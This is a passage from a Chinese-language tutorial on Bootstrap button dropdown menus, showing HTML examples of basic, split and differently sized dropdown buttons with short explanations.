class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="4-按钮式下拉菜单"><a href="#4-按钮式下拉菜单" class="headerlink" title="4.按钮式下拉菜单"></a>4.按钮式下拉菜单</h2><p>把任意一个按钮放入 <code>.btn-group</code> 中，然后加入适当的菜单标签，就可以让按钮作为菜单的触发器了。也可以使用 <code>&lt;span class=&quot;caret&quot;&gt;&lt;/span&gt;</code> 来指示按钮作为下拉菜单。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//1<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">aria-haspopup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br>    Action <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Another action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Something else here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;separator&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Separated link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>//2<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span>默认<br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menu&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>其他<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span>原始<br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menu&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>其他<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-1-分裂式按钮下拉菜单"><a href="#4-1-分裂式按钮下拉菜单" class="headerlink" title="4.1 分裂式按钮下拉菜单"></a>4.1 分裂式按钮下拉菜单</h3><p>分割的按钮下拉菜单使用与下拉菜单按钮大致相同的样式，但是对下拉菜单添加了原始的功能。分割按钮的左边是原始的功能，右边是显示下拉菜单的切换。只是多一个分开的按钮。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//1<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger&quot;</span>&gt;</span>Action<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">aria-haspopup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>Toggle Dropdown<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Another action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Something else here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;separator&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Separated link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>//2<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>默认<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default dropdown-toggle&quot;</span> </span><br><span class="hljs-tag">        <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>切换下拉菜单<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menu&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>其他<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>原始<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>切换下拉菜单<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menu&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>其他<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-2-按钮下拉菜单的大小"><a href="#4-2-按钮下拉菜单的大小" class="headerlink" title="4.2 按钮下拉菜单的大小"></a>4.2 按钮下拉菜单的大小</h3><p>可以使用带有各种大小按钮的下拉菜单：<code>.btn-lg</code>、<code>.btn-sm</code> 或 <code>.btn-xs</code>。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//1<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default dropdown-toggle btn-lg&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span>默认<br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menu&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>其他<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br>//2<br><span class="hljs-comment">&lt;!-- Large button group --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg dropdown-toggle&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">aria-haspopup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br>    Large button <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>    ...<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- Small button group --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span 